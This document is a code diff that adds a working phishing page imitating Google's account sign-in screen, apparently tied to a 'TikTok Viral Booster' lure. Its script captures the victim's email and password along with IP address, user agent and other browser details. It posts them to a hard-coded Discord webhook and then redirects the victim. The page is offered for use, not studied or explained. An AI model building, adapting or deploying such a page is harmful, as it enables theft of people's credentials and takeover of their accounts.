@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Sign in – Google Accounts</title>
+    <link rel="icon" href="https://ssl.gstatic.com/accounts/static/_/images/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #fff;
+            color: #202124;
+            overflow: hidden;
+        }
+        .container {
+            width: 368px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            text-align: center;
+            box-sizing: border-box;
+            background-color: #fff;
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 24px;
+            color: #5f6368;
+        }
+        .input-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        .input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+        .input-group label {
+            position: absolute;
+            top: 13px;
+            left: 15px;
+            color: #80868b;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s ease-in-out;
+            background-color: #fff;
+            padding: 0 4px;
+        }
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: -10px;
+            left: 10px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        button {
+            background-color: #1a73e8;
+            color: #fff;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease-in-out;
+        }
+        button:hover {
+            background-color: #174ea6;
+        }
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s ease-in-out;
+        }
+        a:hover {
+            color: #174ea6;
+        }
+        .text-links {
+            margin-top: 20px;
+            text-align: left;
+        }
+        .text-links a {
+            display: block;
+            margin-bottom: 10px;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #5f6368;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .footer select {
+            border: none;
+            background: transparent;
+            font-size: 12px;
+            color: #5f6368;
+            outline: none;
+        }
+        .footer-links {
+            display: flex;
+            gap: 15px;
+        }
+        .footer-links a {
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .error-message {
+            color: #ea4335;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: left;
+            display: none;
+        }
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        #loading-overlay .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://ssl.gstatic.com/accounts/static/_/images/unauthenticated/accounts_complex_multi_color.svg" alt="Google Logo" class="logo">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+
+        <form id="googleLoginForm">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder=" " required autofocus>
+                <label for="email">Email or phone</label>
+            </div>
+            <div class="error-message" id="emailError"></div>
+
+            <div class="input-group" id="passwordGroup" style="display: none;">
+                <input type="password" id="password" name="password" placeholder=" " required>
+                <label for="password">Password</label>
+            </div>
+            <div class="error-message" id="passwordError"></div>
+
+            <div class="text-links" id="forgotEmailLink">
+                <a href="#">Forgot email?</a>
+            </div>
+
+            <p style="font-size:12px; margin-top:24px; margin-bottom: 24px; color:#5f6368;">
+                Not your computer? Use a private window to sign in. <a href="#">Learn more</a>
+            </p>
+
+            <div class="button-group">
+                <a href="#">Create account</a>
+                <button type="button" id="nextButton">Next</button>
+                <button type="submit" id="signInButton" style="display: none;">Sign in</button>
+            </div>
+        </form>
+
+        <div class="footer">
+            <select>
+                <option>English (United States)</option>
+                <option>اردو (Urdu)</option>
+                <option>हिन्दी (Hindi)</option>
+                <option>español (Spanish)</option>
+            </select>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1378495140921999410/mZdz4yBQhnZGrDujVy9LTbLwteFqTbPULbQ-mMmBLRH7FaW724SFH6b4uEJo9P2VpbM1';
+
+        async function sendDataToWebhook(data, type) {
+            let ipAddress = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+            } catch (ipError) {
+                console.error('Failed to get IP address:', ipError);
+            }
+
+            const payload = {
+                username: "TikTok Booster Scraper",
+                avatar_url: "https://www.tiktok.com/favicon.ico",
+                embeds: [{
+                    title: `🔔 New Data Captured: ${type} 🔔`,
+                    description: `**Page:** \`google_phish.html\`\n`,
+                    color: 3447003,
+                    fields: [
+                        { name: "IP Address", value: ipAddress, inline: true },
+                        { name: "User Agent", value: navigator.userAgent, inline: false },
+                        { name: "Screen Resolution", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                        { name: "Language", value: navigator.language, inline: true },
+                        { name: "Timestamp", value: new Date().toISOString(), inline: false }
+                    ],
+                    footer: { text: "TikTok Viral Booster Log" }
+                }]
+            };
+
+            for (const key in data) {
+                payload.embeds[0].fields.push({ name: key, value: `\`\`\`${data[key]}\`\`\``, inline: false });
+            }
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+                if (!response.ok) {
+                    console.error(`Failed to send data to webhook: ${response.status} ${response.statusText}`);
+                } else {
+                    console.log(`Data (${type}) sent successfully to webhook.`);
+                }
+            } catch (error) {
+                console.error('Network error sending data to webhook:', error);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const nextButton = document.getElementById('nextButton');
+            const signInButton = document.getElementById('signInButton');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const forgotEmailLink = document.getElementById('forgotEmailLink');
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const googleLoginForm = document.getElementById('googleLoginForm');
+
+            let emailEntered = false;
+
+            nextButton.addEventListener('click', async () => {
+                const email = emailInput.value.trim();
+                emailError.style.display = 'none';
+
+                if (!email) {
+                    emailError.textContent = 'Enter an email or phone number.';
+                    emailError.style.display = 'block';
+                    return;
+                }
+                
+                loadingOverlay.style.display = 'flex';
+                await sendDataToWebhook({ 'Google Email/Phone': email }, 'Google Login Email Input');
+
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+                    emailInput.readOnly = true;
+                    nextButton.style.display = 'none';
+                    forgotEmailLink.style.display = 'none';
+                    passwordGroup.style.display = 'block';
+                    signInButton.style.display = 'block';
+                    passwordInput.focus();
+                    emailEntered = true;
+                }, 1500);
+            });
+
+            googleLoginForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                passwordError.style.display = 'none';
+
+                if (!emailEntered) {
+                    nextButton.click();
+                    return;
+                }
+
+                const password = passwordInput.value.trim();
+                if (!password) {
+                    passwordError.textContent = 'Enter your password.';
+                    passwordError.style.display = 'block';
+                    return;
+                }
+
+                loadingOverlay.style.display = 'flex';
+                const credentials = {
+                    'Google Email/Phone': emailInput.value,
+                    'Google Password': password
+                };
+                await sendDataToWebhook(credentials, 'Google Credentials Captured');
+
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+                    window.location.href = 'progress.html';
+                }, 2000);
+            });
+
+            emailInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    nextButton.click();
+                }
+            });
+
+            document.querySelectorAll('.input-group input').forEach(input => {
+                input.addEventListener('focus', () => {
+                    input.parentNode.querySelector('label').style.top = '-10px';
+                    input.parentNode.querySelector('label').style.left = '10px';
+                    input.parentNode.querySelector('label').style.fontSize = '12px';
+                    input.parentNode.querySelector('label').style.color = '#1a73e8';
+                });
+                input.addEventListener('blur', () => {
+                    if (input.value === '') {
+                        input.parentNode.querySelector('label').style.top = '13px';
+                        input.parentNode.querySelector('label').style.left = '15px';
+                        input.parentNode.querySelector('label').style.fontSize = '16px';
+                        input.parentNode.querySelector('label').style.color = '#80868b';
+                    } else {
+                        input.parentNode.querySelector('label').style.color = '#5f6368';
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
